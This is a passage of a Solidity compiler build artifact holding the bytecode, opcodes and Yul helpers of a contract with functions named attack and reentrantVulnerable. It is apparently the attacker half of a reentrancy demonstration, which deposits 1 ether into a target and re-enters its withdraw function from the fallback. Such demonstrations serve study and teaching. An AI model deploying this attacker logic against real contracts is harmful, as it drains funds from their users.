0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x252 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x266 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2D3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x2F6 DUP2 PUSH2 0x3BF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x309 PUSH1 0xD DUP4 PUSH2 0x384 JUMP JUMPDEST SWAP2 POP PUSH2 0x314 DUP3 PUSH2 0x3F5 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x328 DUP2 PUSH2 0x3B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x343 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2ED JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x362 DUP2 PUSH2 0x2FC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x37E PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x31F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3CA DUP3 PUSH2 0x3D1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3DC DUP3 PUSH2 0x3E3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3EE DUP3 PUSH2 0x395 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x6920676F74206E6F206964656100000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x7669702EA4A58D060ACB74CFF23915C6 SELFDESTRUCT 0xB7 0x4E 0xCA 0x2B TIMESTAMP SWAP5 SIGNEXTEND STATICCALL ISZERO 0x2A GASPRICE PUSH3 0x6B5C64 PUSH20 0x6F6C634300080700330000000000000000000000 ","sourceMap":"548:715:12:-:0;;;623:122;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;717:20;675:19;;:63;;;;;;;;;;;;;;;;;;623:122;548:715;;7:143:15;64:5;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;7:143;;;;:::o;156:351::-;226:6;275:2;263:9;254:7;250:23;246:32;243:119;;;281:79;;:::i;:::-;243:119;401:1;426:64;482:7;473:6;462:9;458:22;426:64;:::i;:::-;416:74;;372:128;156:351;;;;:::o;594:96::-;631:7;660:24;678:5;660:24;:::i;:::-;649:35;;594:96;;;:::o;696:126::-;733:7;773:42;766:5;762:54;751:65;;696:126;;;:::o;951:117::-;1060:1;1057;1050:12;1074:122;1147:24;1165:5;1147:24;:::i;:::-;1140:5;1137:35;1127:63;;1186:1;1183;1176:12;1127:63;1074:122;:::o;548:715:12:-;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@_3151":{"entryPoint":null,"id":3151,"parameterSlots":0,"returnSlots":0},"@_3159":{"entryPoint":null,"id":3159,"parameterSlots":0,"returnSlots":0},"@attack_3182":{"entryPoint":461,"id":3182,"parameterSlots":0,"returnSlots":0},"@getBalance_3194":{"entryPoint":417,"id":3194,"parameterSlots":0,"returnSlots":1},"@reentrantVulnerable_3121":{"entryPoint":425,"id":3121,"parameterSlots":0,"returnSlots":0},"abi_encode_t_contract$_ReentrantVulnerable_$3118_to_t_address_fromStack":{"entryPoint":749,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c_to_t_string_memory_ptr_fromStack":{"entryPoint":764,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":799,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_contract$_ReentrantVulnerable_$3118__to_t_address__fromStack_reversed":{"entryPoint":814,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":841,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":873,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":900,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":917,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":949,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_contract$_ReentrantVulnerable_$3118_to_t_address":{"entryPoint":959,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_uint160_to_t_address":{"entryPoint":977,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_uint160_to_t_uint160":{"entryPoint":995,"id":null,"parameterSlots":1,"returnSlots":1},"store_literal_in_memory_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c":{"entryPoint":1013,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:2600:15","statements":[{"body":{"nodeType":"YulBlock","src":"100:94:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"117:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"181:5:15"}],"functionName":{"name":"convert_t_contract$_ReentrantVulnerable_$3118_to_t_address","nodeType":"YulIdentifier","src":"122:58:15"},"nodeType":"YulFunctionCall","src":"122:65:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"110:6:15"},"nodeType":"YulFunctionCall","src":"110:78:15"},"nodeType":"YulExpressionStatement","src":"110:78:15"}]},"name":"abi_encode_t_contract$_ReentrantVulnerable_$3118_to_t_address_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"88:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"95:3:15","type":""}],"src":"7:187:15"},{"body":{"nodeType":"YulBlock","src":"346:220:15","statements":[{"nodeType":"YulAssignment","src":"356:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"422:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"427:2:15","type":"","value":"13"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"363:58:15"},"nodeType":"YulFunctionCall","src":"363:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"356:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"528:3:15"}],"functionName":{"name":"store_literal_in_memory_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c","nodeType":"YulIdentifier","src":"439:88:15"},"nodeType":"YulFunctionCall","src":"439:93:15"},"nodeType":"YulExpressionStatement","src":"439:93:15"},{"nodeType":"YulAssignment","src":"541:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"552:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"557:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"548:3:15"},"nodeType":"YulFunctionCall","src":"548:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"541:3:15"}]}]},"name":"abi_encode_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"334:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"342:3:15","type":""}],"src":"200:366:15"},{"body":{"nodeType":"YulBlock","src":"637:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"654:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"677:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"659:17:15"},"nodeType":"YulFunctionCall","src":"659:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"647:6:15"},"nodeType":"YulFunctionCall","src":"647:37:15"},"nodeType":"YulExpressionStatement","src":"647:37:15"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"625:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"632:3:15","type":""}],"src":"572:118:15"},{"body":{"nodeType":"YulBlock","src":"822:152:15","statements":[{"nodeType":"YulAssignment","src":"832:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"844:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"855:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"840:3:15"},"nodeType":"YulFunctionCall","src":"840:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"832:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"940:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"953:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"964:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"949:3:15"},"nodeType":"YulFunctionCall","src":"949:17:15"}],"functionName":{"name":"abi_encode_t_contract$_ReentrantVulnerable_$3118_to_t_address_fromStack","nodeType":"YulIdentifier","src":"868:71:15"},"nodeType":"YulFunctionCall","src":"868:99:15"},"nodeType":"YulExpressionStatement","src":"868:99:15"}]},"name":"abi_encode_tuple_t_contract$_ReentrantVulnerable_$3118__to_t_address__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"794:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"806:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"817:4:15","type":""}],"src":"696:278:15"},{"body":{"nodeType":"YulBlock","src":"1151:248:15","statements":[{"nodeType":"YulAssignment","src":"1161:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1173:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"1184:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1169:3:15"},"nodeType":"YulFunctionCall","src":"1169:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"1161:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1208:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"1219:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1204:3:15"},"nodeType":"YulFunctionCall","src":"1204:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"1227:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1233:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1223:3:15"},"nodeType":"YulFunctionCall","src":"1223:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"1197:6:15"},"nodeType":"YulFunctionCall","src":"1197:47:15"},"nodeType":"YulExpressionStatement","src":"1197:47:15"},{"nodeType":"YulAssignment","src":"1253:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"1387:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"1261:124:15"},"nodeType":"YulFunctionCall","src":"1261:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"1253:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1131:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"1146:4:15","type":""}],"src":"980:419:15"},{"body":{"nodeType":"YulBlock","src":"1503:124:15","statements":[{"nodeType":"YulAssignment","src":"1513:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1525:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"1536:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1521:3:15"},"nodeType":"YulFunctionCall","src":"1521:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"1513:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"1593:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1606:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"1617:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1602:3:15"},"nodeType":"YulFunctionCall","src":"1602:17:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"1549:43:15"},"nodeType":"YulFunctionCall","src":"1549:71:15"},"nodeType":"YulExpressionStatement","src":"1549:71:15"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1475:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"1487:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"1498:4:15","type":""}],"src":"1405:222:15"},{"body":{"nodeType":"YulBlock","src":"1729:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1746:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"1751:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"1739:6:15"},"nodeType":"YulFunctionCall","src":"1739:19:15"},"nodeType":"YulExpressionStatement","src":"1739:19:15"},{"nodeType":"YulAssignment","src":"1767:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"1786:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"1791:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1782:3:15"},"nodeType":"YulFunctionCall","src":"1782:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"1767:11:15"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"1701:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"1706:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"1717:11:15","type":""}],"src":"1633:169:15"},{"body":{"nodeType":"YulBlock","src":"1853:81:15","statements":[{"nodeType":"YulAssignment","src":"1863:65:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"1878:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"1885:42:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"1874:3:15"},"nodeType":"YulFunctionCall","src":"1874:54:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"1863:7:15"}]}]},"name":"cleanup_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"1835:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"1845:7:15","type":""}],"src":"1808:126:15"},{"body":{"nodeType":"YulBlock","src":"1985:32:15","statements":[{"nodeType":"YulAssignment","src":"1995:16:15","value":{"name":"value","nodeType":"YulIdentifier","src":"2006:5:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"1995:7:15"}]}]},"name":"cleanup_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"1967:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"1977:7:15","type":""}],"src":"1940:77:15"},{"body":{"nodeType":"YulBlock","src":"2111:66:15","statements":[{"nodeType":"YulAssignment","src":"2121:50:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"2165:5:15"}],"functionName":{"name":"convert_t_uint160_to_t_address","nodeType":"YulIdentifier","src":"2134:30:15"},"nodeType":"YulFunctionCall","src":"2134:37:15"},"variableNames":[{"name":"converted","nodeType":"YulIdentifier","src":"2121:9:15"}]}]},"name":"convert_t_contract$_ReentrantVulnerable_$3118_to_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"2091:5:15","type":""}],"returnVariables":[{"name":"converted","nodeType":"YulTypedName","src":"2101:9:15","type":""}],"src":"2023:154:15"},{"body":{"nodeType":"YulBlock","src":"2243:66:15","statements":[{"nodeType":"YulAssignment","src":"2253:50:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"2297:5:15"}],"functionName":{"name":"convert_t_uint160_to_t_uint160","nodeType":"YulIdentifier","src":"2266:30:15"},"nodeType":"YulFunctionCall","src":"2266:37:15"},"variableNames":[{"name":"converted","nodeType":"YulIdentifier","src":"2253:9:15"}]}]},"name":"convert_t_uint160_to_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"2223:5:15","type":""}],"returnVariables":[{"name":"converted","nodeType":"YulTypedName","src":"2233:9:15","type":""}],"src":"2183:126:15"},{"body":{"nodeType":"YulBlock","src":"2375:53:15","statements":[{"nodeType":"YulAssignment","src":"2385:37:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"2416:5:15"}],"functionName":{"name":"cleanup_t_uint160","nodeType":"YulIdentifier","src":"2398:17:15"},"nodeType":"YulFunctionCall","src":"2398:24:15"},"variableNames":[{"name":"converted","nodeType":"YulIdentifier","src":"2385:9:15"}]}]},"name":"convert_t_uint160_to_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"2355:5:15","type":""}],"returnVariables":[{"name":"converted","nodeType":"YulTypedName","src":"2365:9:15","type":""}],"src":"2315:113:15"},{"body":{"nodeType":"YulBlock","src":"2540:57:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"2562:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"2570:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2558:3:15"},"nodeType":"YulFunctionCall","src":"2558:14:15"},{"hexValue":"6920676f74206e6f2069646561","kind":"string","nodeType":"YulLiteral","src":"2574:15:15","type":"","value":"i got no idea"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"2551:6:15"},"nodeType":"YulFunctionCall","src":"2551:39:15"},"nodeType":"YulExpressionStatement","src":"2551:39:15"}]},"name":"store_literal_in_memory_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"2532:6:15","type":""}],"src":"2434:163:15"}]},"contents":"{\n\n    function abi_encode_t_contract$_ReentrantVulnerable_$3118_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_ReentrantVulnerable_$3118_to_t_address(value))\n    }\n\n    function abi_encode_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 13)\n        store_literal_in_memory_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_contract$_ReentrantVulnerable_$3118__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_ReentrantVulnerable_$3118_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function convert_t_contract$_ReentrantVulnerable_$3118_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_address(value)\n    }\n\n    function convert_t_uint160_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_uint160(value)\n    }\n\n    function convert_t_uint160_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(value)\n    }\n\n    function store_literal_in_memory_4f9c42ed167b9feed305f7672354cfd76c424fea19fe2c909663497fcd46330c(memPtr) {\n\n        mstore(add(memPtr, 0), \"i got no idea\")\n\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"6080604052600436106100385760003560e01c806312065fe01461014157806333684a051461016c5780639e5faafc1461019757610078565b36610078576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161006f90610349565b60405180910390fd5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061013f5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561012657600080fd5b505af115801561013a573d6000803e3d6000fd5b505050505b005b34801561014d57600080fd5b506101566101a1565b6040516101639190610369565b60405180910390f35b34801561017857600080fd5b506101816101a9565b60405161018e919061032e565b60405180910390f35b61019f6101cd565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156101e257600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561025257600080fd5b505af1158015610266573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102d357600080fd5b505af11580156102e7573d6000803e3d6000fd5b50505050565b6102f6816103bf565b82525050565b6000610309600d83610384565b9150610314826103f5565b602082019050919050565b610328816103b5565b82525050565b600060208201905061034360008301846102ed565b92915050565b60006020820190508181036000830152610362816102fc565b9050919050565b600060208201905061037e600083018461031f565b92915050565b600082825260208201905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103ca826103d1565b9050919050565b60006103dc826103e3565b9050919050565b60006103ee82610395565b9050919050565b7f6920676f74206e6f20696465610000000000000000000000000000000000000060008201525056fea26469706673582212206f7669702ea4a58d060acb74cff23915c6ffb74eca2b42940bfa152a3a626b5c64736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x141 JUMPI DUP1 PUSH4 0x33684A05 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x197 JUMPI PUSH2 0x78 JUMP JUMPDEST CALLDATASIZE PUSH2 0x78 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6F SWAP1 PUSH2 0x349 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x13F JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x126 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x13A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x156 PUSH2 0x1A1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x163 SWAP2 SWAP1 PUSH2 0x369 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x178 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH2 0x1A9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x18E SWAP2 SWAP1 PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x1CD JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 